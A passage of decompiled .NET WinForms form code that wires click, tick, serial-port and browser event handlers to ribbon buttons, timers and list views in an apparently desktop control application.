				_ButtonItem31.Click += value2;
			}
		}
	}

	internal virtual ButtonItem ButtonItem33
	{
		[DebuggerNonUserCode]
		get
		{
			return _ButtonItem33;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem33_Click;
			if (_ButtonItem33 != null)
			{
				_ButtonItem33.Click -= value2;
			}
			_ButtonItem33 = value;
			if (_ButtonItem33 != null)
			{
				_ButtonItem33.Click += value2;
			}
		}
	}

	internal virtual RibbonBar RibbonBar3
	{
		[DebuggerNonUserCode]
		get
		{
			return _RibbonBar3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_RibbonBar3 = value;
		}
	}

	internal virtual ButtonItem B13
	{
		[DebuggerNonUserCode]
		get
		{
			return _B13;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem20_Click;
			if (_B13 != null)
			{
				_B13.Click -= value2;
			}
			_B13 = value;
			if (_B13 != null)
			{
				_B13.Click += value2;
			}
		}
	}

	internal virtual RibbonPanel RibbonPanel6
	{
		[DebuggerNonUserCode]
		get
		{
			return _RibbonPanel6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_RibbonPanel6 = value;
		}
	}

	internal virtual RibbonTabItem RibbonTabItem5
	{
		[DebuggerNonUserCode]
		get
		{
			return _RibbonTabItem5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_RibbonTabItem5 = value;
		}
	}

	internal virtual PanelEx PanelEx1
	{
		[DebuggerNonUserCode]
		get
		{
			return _PanelEx1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_PanelEx1 = value;
		}
	}

	internal virtual Label Label2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label2 = value;
		}
	}

	internal virtual Timer Timer1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = Timer1_Tick;
			if (_Timer1 != null)
			{
				_Timer1.Tick -= value2;
			}
			_Timer1 = value;
			if (_Timer1 != null)
			{
				_Timer1.Tick += value2;
			}
		}
	}

	internal virtual RibbonBar RibbonBar1
	{
		[DebuggerNonUserCode]
		get
		{
			return _RibbonBar1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_RibbonBar1 = value;
		}
	}

	internal virtual ButtonItem B2
	{
		[DebuggerNonUserCode]
		get
		{
			return _B2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = [SpecialName] [DebuggerStepThrough] (object sender, EventArgs e) =>
			{
				ButtonItem10_Click(RuntimeHelpers.GetObjectValue(sender), e);
			};
			if (_B2 != null)
			{
				_B2.Click -= value2;
			}
			_B2 = value;
			if (_B2 != null)
			{
				_B2.Click += value2;
			}
		}
	}

	internal virtual ButtonItem B3
	{
		[DebuggerNonUserCode]
		get
		{
			return _B3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem12_Click;
			if (_B3 != null)
			{
				_B3.Click -= value2;
			}
			_B3 = value;
			if (_B3 != null)
			{
				_B3.Click += value2;
			}
		}
	}

	internal virtual RibbonBar RibbonBar4
	{
		[DebuggerNonUserCode]
		get
		{
			return _RibbonBar4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_RibbonBar4 = value;
		}
	}

	internal virtual ButtonItem B11
	{
		[DebuggerNonUserCode]
		get
		{
			return _B11;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem21_Click;
			if (_B11 != null)
			{
				_B11.Click -= value2;
			}
			_B11 = value;
			if (_B11 != null)
			{
				_B11.Click += value2;
			}
		}
	}

	internal virtual ButtonItem B10
	{
		[DebuggerNonUserCode]
		get
		{
			return _B10;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem13_Click;
			if (_B10 != null)
			{
				_B10.Click -= value2;
			}
			_B10 = value;
			if (_B10 != null)
			{
				_B10.Click += value2;
			}
		}
	}

	internal virtual RibbonBar RibbonBar9
	{
		[DebuggerNonUserCode]
		get
		{
			return _RibbonBar9;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_RibbonBar9 = value;
		}
	}

	internal virtual RibbonBar RibbonBar8
	{
		[DebuggerNonUserCode]
		get
		{
			return _RibbonBar8;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_RibbonBar8 = value;
		}
	}

	internal virtual ButtonItem B14
	{
		[DebuggerNonUserCode]
		get
		{
			return _B14;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem34_Click;
			if (_B14 != null)
			{
				_B14.Click -= value2;
			}
			_B14 = value;
			if (_B14 != null)
			{
				_B14.Click += value2;
			}
		}
	}

	internal virtual ButtonItem B15
	{
		[DebuggerNonUserCode]
		get
		{
			return _B15;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem36_Click;
			if (_B15 != null)
			{
				_B15.Click -= value2;
			}
			_B15 = value;
			if (_B15 != null)
			{
				_B15.Click += value2;
			}
		}
	}

	internal virtual ButtonItem B17
	{
		[DebuggerNonUserCode]
		get
		{
			return _B17;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem5_Click;
			if (_B17 != null)
			{
				_B17.Click -= value2;
			}
			_B17 = value;
			if (_B17 != null)
			{
				_B17.Click += value2;
			}
		}
	}

	internal virtual ButtonItem B16
	{
		[DebuggerNonUserCode]
		get
		{
			return _B16;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem6_Click;
			if (_B16 != null)
			{
				_B16.Click -= value2;
			}
			_B16 = value;
			if (_B16 != null)
			{
				_B16.Click += value2;
			}
		}
	}

	internal virtual RibbonBar RibbonBar_0
	{
		[DebuggerNonUserCode]
		get
		{
			return _RibbonBar10;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_RibbonBar10 = value;
		}
	}

	internal virtual ButtonItem B21
	{
		[DebuggerNonUserCode]
		get
		{
			return _B21;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem29_Click;
			if (_B21 != null)
			{
				_B21.Click -= value2;
			}
			_B21 = value;
			if (_B21 != null)
			{
				_B21.Click += value2;
			}
		}
	}

	internal virtual ButtonItem B22
	{
		[DebuggerNonUserCode]
		get
		{
			return _B22;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem32_Click;
			if (_B22 != null)
			{
				_B22.Click -= value2;
			}
			_B22 = value;
			if (_B22 != null)
			{
				_B22.Click += value2;
			}
		}
	}

	internal virtual RibbonBar RibbonBar_1
	{
		[DebuggerNonUserCode]
		get
		{
			return _RibbonBar11;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_RibbonBar11 = value;
		}
	}

	internal virtual ButtonItem B7
	{
		[DebuggerNonUserCode]
		get
		{
			return _B7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem11_Click;
			if (_B7 != null)
			{
				_B7.Click -= value2;
			}
			_B7 = value;
			if (_B7 != null)
			{
				_B7.Click += value2;
			}
		}
	}

	internal virtual ButtonItem B8
	{
		[DebuggerNonUserCode]
		get
		{
			return _B8;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem28_Click;
			if (_B8 != null)
			{
				_B8.Click -= value2;
			}
			_B8 = value;
			if (_B8 != null)
			{
				_B8.Click += value2;
			}
		}
	}

	internal virtual ButtonItem ButtonItem38
	{
		[DebuggerNonUserCode]
		get
		{
			return _ButtonItem38;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem38_Click;
			if (_ButtonItem38 != null)
			{
				_ButtonItem38.Click -= value2;
			}
			_ButtonItem38 = value;
			if (_ButtonItem38 != null)
			{
				_ButtonItem38.Click += value2;
			}
		}
	}

	internal virtual ButtonItem B6
	{
		[DebuggerNonUserCode]
		get
		{
			return _B6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem40_Click;
			if (_B6 != null)
			{
				_B6.Click -= value2;
			}
			_B6 = value;
			if (_B6 != null)
			{
				_B6.Click += value2;
			}
		}
	}

	internal virtual ButtonItem B9
	{
		[DebuggerNonUserCode]
		get
		{
			return _B9;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem42_Click;
			if (_B9 != null)
			{
				_B9.Click -= value2;
			}
			_B9 = value;
			if (_B9 != null)
			{
				_B9.Click += value2;
			}
		}
	}

	internal virtual ButtonItem B5
	{
		[DebuggerNonUserCode]
		get
		{
			return _B5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem41_Click;
			if (_B5 != null)
			{
				_B5.Click -= value2;
			}
			_B5 = value;
			if (_B5 != null)
			{
				_B5.Click += value2;
			}
		}
	}

	internal virtual ButtonItem B4
	{
		[DebuggerNonUserCode]
		get
		{
			return _B4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem43_Click;
			if (_B4 != null)
			{
				_B4.Click -= value2;
			}
			_B4 = value;
			if (_B4 != null)
			{
				_B4.Click += value2;
			}
		}
	}

	internal virtual ButtonItem B1
	{
		[DebuggerNonUserCode]
		get
		{
			return _B1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem9_Click;
			if (_B1 != null)
			{
				_B1.Click -= value2;
			}
			_B1 = value;
			if (_B1 != null)
			{
				_B1.Click += value2;
			}
		}
	}

	internal virtual LabelItem LabelStatus
	{
		[DebuggerNonUserCode]
		get
		{
			return _LabelStatus;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_LabelStatus = value;
		}
	}

	internal virtual RibbonBar RibbonBar2
	{
		[DebuggerNonUserCode]
		get
		{
			return _RibbonBar2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_RibbonBar2 = value;
		}
	}

	internal virtual ButtonItem ButtonItem23
	{
		[DebuggerNonUserCode]
		get
		{
			return _ButtonItem23;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem23_Click;
			if (_ButtonItem23 != null)
			{
				_ButtonItem23.Click -= value2;
			}
			_ButtonItem23 = value;
			if (_ButtonItem23 != null)
			{
				_ButtonItem23.Click += value2;
			}
		}
	}

	internal virtual ButtonItem B19
	{
		[DebuggerNonUserCode]
		get
		{
			return _B19;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem39_Click;
			if (_B19 != null)
			{
				_B19.Click -= value2;
			}
			_B19 = value;
			if (_B19 != null)
			{
				_B19.Click += value2;
			}
		}
	}

	internal virtual ButtonItem B20
	{
		[DebuggerNonUserCode]
		get
		{
			return _B20;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem45_Click;
			if (_B20 != null)
			{
				_B20.Click -= value2;
			}
			_B20 = value;
			if (_B20 != null)
			{
				_B20.Click += value2;
			}
		}
	}

	internal virtual ButtonItem B18
	{
		[DebuggerNonUserCode]
		get
		{
			return _B18;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem47_Click;
			if (_B18 != null)
			{
				_B18.Click -= value2;
			}
			_B18 = value;
			if (_B18 != null)
			{
				_B18.Click += value2;
			}
		}
	}

	internal virtual ButtonItem ButtonItem49
	{
		[DebuggerNonUserCode]
		get
		{
			return _ButtonItem49;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem49_Click;
			if (_ButtonItem49 != null)
			{
				_ButtonItem49.Click -= value2;
			}
			_ButtonItem49 = value;
			if (_ButtonItem49 != null)
			{
				_ButtonItem49.Click += value2;
			}
		}
	}

	internal virtual RibbonPanel RibbonPanel5
	{
		[DebuggerNonUserCode]
		get
		{
			return _RibbonPanel5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_RibbonPanel5 = value;
		}
	}

	internal virtual RibbonBar RibbonBar_2
	{
		[DebuggerNonUserCode]
		get
		{
			return _RibbonBar12;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_RibbonBar12 = value;
		}
	}

	internal virtual RibbonTabItem RibbonTabItem4
	{
		[DebuggerNonUserCode]
		get
		{
			return _RibbonTabItem4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = RibbonTabItem4_Click;
			if (_RibbonTabItem4 != null)
			{
				_RibbonTabItem4.Click -= value2;
			}
			_RibbonTabItem4 = value;
			if (_RibbonTabItem4 != null)
			{
				_RibbonTabItem4.Click += value2;
			}
		}
	}

	internal virtual RibbonBar RibbonBar_3
	{
		[DebuggerNonUserCode]
		get
		{
			return _RibbonBar13;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_RibbonBar13 = value;
		}
	}

	internal virtual ItemContainer ItemContainer4
	{
		[DebuggerNonUserCode]
		get
		{
			return _ItemContainer4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ItemContainer4 = value;
		}
	}

	internal virtual ButtonItem R17
	{
		[DebuggerNonUserCode]
		get
		{
			return _R17;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem73_Click;
			if (_R17 != null)
			{
				_R17.Click -= value2;
			}
			_R17 = value;
			if (_R17 != null)
			{
				_R17.Click += value2;
			}
		}
	}

	internal virtual ButtonItem R18
	{
		[DebuggerNonUserCode]
		get
		{
			return _R18;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem74_Click;
			if (_R18 != null)
			{
				_R18.Click -= value2;
			}
			_R18 = value;
			if (_R18 != null)
			{
				_R18.Click += value2;
			}
		}
	}

	internal virtual RibbonBar RibbonBar_4
	{
		[DebuggerNonUserCode]
		get
		{
			return _RibbonBar14;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_RibbonBar14 = value;
		}
	}

	internal virtual ItemContainer ItemContainer5
	{
		[DebuggerNonUserCode]
		get
		{
			return _ItemContainer5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ItemContainer5 = value;
		}
	}

	internal virtual ButtonItem R19
	{
		[DebuggerNonUserCode]
		get
		{
			return _R19;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem75_Click;
			if (_R19 != null)
			{
				_R19.Click -= value2;
			}
			_R19 = value;
			if (_R19 != null)
			{
				_R19.Click += value2;
			}
		}
	}

	internal virtual ButtonItem R20
	{
		[DebuggerNonUserCode]
		get
		{
			return _R20;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem76_Click;
			if (_R20 != null)
			{
				_R20.Click -= value2;
			}
			_R20 = value;
			if (_R20 != null)
			{
				_R20.Click += value2;
			}
		}
	}

	internal virtual RibbonBar RibbonBar6
	{
		[DebuggerNonUserCode]
		get
		{
			return _RibbonBar6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_RibbonBar6 = value;
		}
	}

	internal virtual ButtonItem ButtonItem48
	{
		[DebuggerNonUserCode]
		get
		{
			return _ButtonItem48;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem48_Click;
			if (_ButtonItem48 != null)
			{
				_ButtonItem48.Click -= value2;
			}
			_ButtonItem48 = value;
			if (_ButtonItem48 != null)
			{
				_ButtonItem48.Click += value2;
			}
		}
	}

	internal virtual ButtonItem B12
	{
		[DebuggerNonUserCode]
		get
		{
			return _B12;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = B12_Click;
			if (_B12 != null)
			{
				_B12.Click -= value2;
			}
			_B12 = value;
			if (_B12 != null)
			{
				_B12.Click += value2;
			}
		}
	}

	internal virtual ButtonItem ButtonItem6
	{
		[DebuggerNonUserCode]
		get
		{
			return _ButtonItem6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem6_Click_1;
			if (_ButtonItem6 != null)
			{
				_ButtonItem6.Click -= value2;
			}
			_ButtonItem6 = value;
			if (_ButtonItem6 != null)
			{
				_ButtonItem6.Click += value2;
			}
		}
	}

	internal virtual ItemContainer ItemContainer3
	{
		[DebuggerNonUserCode]
		get
		{
			return _ItemContainer3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ItemContainer3 = value;
		}
	}

	internal virtual ButtonItem R13
	{
		[DebuggerNonUserCode]
		get
		{
			return _R13;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem9_Click_1;
			if (_R13 != null)
			{
				_R13.Click -= value2;
			}
			_R13 = value;
			if (_R13 != null)
			{
				_R13.Click += value2;
			}
		}
	}

	internal virtual ButtonItem ButtonItem10
	{
		[DebuggerNonUserCode]
		get
		{
			return _ButtonItem10;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem101_Click;
			if (_ButtonItem10 != null)
			{
				_ButtonItem10.Click -= value2;
			}
			_ButtonItem10 = value;
			if (_ButtonItem10 != null)
			{
				_ButtonItem10.Click += value2;
			}
		}
	}

	internal virtual ButtonItem ButtonItem_0
	{
		[DebuggerNonUserCode]
		get
		{
			return buttonItem_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem_0_Click;
			if (buttonItem_0 != null)
			{
				buttonItem_0.Click -= value2;
			}
			buttonItem_0 = value;
			if (buttonItem_0 != null)
			{
				buttonItem_0.Click += value2;
			}
		}
	}

	internal virtual ButtonItem ButtonItem13
	{
		[DebuggerNonUserCode]
		get
		{
			return _ButtonItem13;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem13_Click_1;
			if (_ButtonItem13 != null)
			{
				_ButtonItem13.Click -= value2;
			}
			_ButtonItem13 = value;
			if (_ButtonItem13 != null)
			{
				_ButtonItem13.Click += value2;
			}
		}
	}

	internal virtual ButtonItem ButtonItem21
	{
		[DebuggerNonUserCode]
		get
		{
			return _ButtonItem21;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem21_Click_1;
			if (_ButtonItem21 != null)
			{
				_ButtonItem21.Click -= value2;
			}
			_ButtonItem21 = value;
			if (_ButtonItem21 != null)
			{
				_ButtonItem21.Click += value2;
			}
		}
	}

	internal virtual ButtonItem ButtonItem28
	{
		[DebuggerNonUserCode]
		get
		{
			return _ButtonItem28;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem28_Click_1;
			if (_ButtonItem28 != null)
			{
				_ButtonItem28.Click -= value2;
			}
			_ButtonItem28 = value;
			if (_ButtonItem28 != null)
			{
				_ButtonItem28.Click += value2;
			}
		}
	}

	internal virtual ButtonItem ButtonItem29
	{
		[DebuggerNonUserCode]
		get
		{
			return _ButtonItem29;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem29_Click_1;
			if (_ButtonItem29 != null)
			{
				_ButtonItem29.Click -= value2;
			}
			_ButtonItem29 = value;
			if (_ButtonItem29 != null)
			{
				_ButtonItem29.Click += value2;
			}
		}
	}

	internal virtual ButtonItem R15
	{
		[DebuggerNonUserCode]
		get
		{
			return _R15;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem9_Click_2;
			if (_R15 != null)
			{
				_R15.Click -= value2;
			}
			_R15 = value;
			if (_R15 != null)
			{
				_R15.Click += value2;
			}
		}
	}

	internal virtual ButtonItem ButtonItem9
	{
		[DebuggerNonUserCode]
		get
		{
			return _ButtonItem9;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem9_Click_3;
			if (_ButtonItem9 != null)
			{
				_ButtonItem9.Click -= value2;
			}
			_ButtonItem9 = value;
			if (_ButtonItem9 != null)
			{
				_ButtonItem9.Click += value2;
			}
		}
	}

	internal virtual ButtonItem ButtonItem32
	{
		[DebuggerNonUserCode]
		get
		{
			return _ButtonItem32;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem32_Click_2;
			if (_ButtonItem32 != null)
			{
				_ButtonItem32.Click -= value2;
			}
			_ButtonItem32 = value;
			if (_ButtonItem32 != null)
			{
				_ButtonItem32.Click += value2;
			}
		}
	}

	internal virtual SerialPort SerialPort1
	{
		[DebuggerNonUserCode]
		get
		{
			return _SerialPort1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			SerialDataReceivedEventHandler value2 = SerialPort1_DataReceived;
			if (_SerialPort1 != null)
			{
				_SerialPort1.DataReceived -= value2;
			}
			_SerialPort1 = value;
			if (_SerialPort1 != null)
			{
				_SerialPort1.DataReceived += value2;
			}
		}
	}

	internal virtual ButtonItem ButtonItem34
	{
		[DebuggerNonUserCode]
		get
		{
			return _ButtonItem34;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem34_Click_1;
			if (_ButtonItem34 != null)
			{
				_ButtonItem34.Click -= value2;
			}
			_ButtonItem34 = value;
			if (_ButtonItem34 != null)
			{
				_ButtonItem34.Click += value2;
			}
		}
	}

	internal virtual WebBrowser WebBrowser1
	{
		[DebuggerNonUserCode]
		get
		{
			return _WebBrowser1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			WebBrowserDocumentCompletedEventHandler value2 = WebBrowser1_DocumentCompleted;
			WebBrowserNavigatingEventHandler value3 = WebBrowser1_Navigating;
			if (_WebBrowser1 != null)
			{
				_WebBrowser1.DocumentCompleted -= value2;
				_WebBrowser1.Navigating -= value3;
			}
			_WebBrowser1 = value;
			if (_WebBrowser1 != null)
			{
				_WebBrowser1.DocumentCompleted += value2;
				_WebBrowser1.Navigating += value3;
			}
		}
	}

	internal virtual Timer TimerOnoff
	{
		[DebuggerNonUserCode]
		get
		{
			return _TimerOnoff;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = TimerOnoff_Tick;
			if (_TimerOnoff != null)
			{
				_TimerOnoff.Tick -= value2;
			}
			_TimerOnoff = value;
			if (_TimerOnoff != null)
			{
				_TimerOnoff.Tick += value2;
			}
		}
	}

	internal virtual Label Label1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label1 = value;
		}
	}

	internal virtual LabelItem LabelItem2
	{
		[DebuggerNonUserCode]
		get
		{
			return _LabelItem2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_LabelItem2 = value;
		}
	}

	internal virtual ButtonItem ButtonItem36
	{
		[DebuggerNonUserCode]
		get
		{
			return _ButtonItem36;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem36_Click_1;
			if (_ButtonItem36 != null)
			{
				_ButtonItem36.Click -= value2;
			}
			_ButtonItem36 = value;
			if (_ButtonItem36 != null)
			{
				_ButtonItem36.Click += value2;
			}
		}
	}

	internal virtual RibbonPanel RibbonPanel4
	{
		[DebuggerNonUserCode]
		get
		{
			return _RibbonPanel4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_RibbonPanel4 = value;
		}
	}

	internal virtual RibbonBar RibbonBar_5
	{
		[DebuggerNonUserCode]
		get
		{
			return _RibbonBar16;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_RibbonBar16 = value;
		}
	}

	internal virtual ButtonItem B24
	{
		[DebuggerNonUserCode]
		get
		{
			return _B24;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem37_Click_1;
			if (_B24 != null)
			{
				_B24.Click -= value2;
			}
			_B24 = value;
			if (_B24 != null)
			{
				_B24.Click += value2;
			}
		}
	}

	internal virtual RibbonTabItem RibbonTabItem_0
	{
		[DebuggerNonUserCode]
		get
		{
			return ribbonTabItem_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			ribbonTabItem_0 = value;
		}
	}

	internal virtual RibbonBar RibbonBar_6
	{
		[DebuggerNonUserCode]
		get
		{
			return _RibbonBar17;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_RibbonBar17 = value;
		}
	}

	internal virtual ButtonItem ButtonItem37
	{
		[DebuggerNonUserCode]
		get
		{
			return _ButtonItem37;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = ButtonItem37_Click_3;
			if (_ButtonItem37 != null)
			{
				_ButtonItem37.Click -= value2;
			}
			_ButtonItem37 = value;
			if (_ButtonItem37 != null)
			{
				_ButtonItem37.Click += value2;
			}
		}
	}

	internal virtual ListView URL_ON_OFF
	{
		[DebuggerNonUserCode]
		get
		{
			return _URL_ON_OFF;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_URL_ON_OFF = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader1
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader1 = value;
		}
	}

	internal virtual LabelItem LabelItem3
	{
		[DebuggerNonUserCode]
		get
		{
			return _LabelItem3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_LabelItem3 = value;
		}
	}

	internal virtual ListView URL_ON_OFF_SERIALS
	{
		[DebuggerNonUserCode]
		get
		{
			return _URL_ON_OFF_SERIALS;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_URL_ON_OFF_SERIALS = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader2
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader2 = value;
		}
	}

	internal virtual Timer TimerSerials
	{
		[DebuggerNonUserCode]
		get
		{
			return _TimerSerials;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler value2 = TimerSerials_Tick;
			if (_TimerSerials != null)
			{
				_TimerSerials.Tick -= value2;
			}
			_TimerSerials = value;
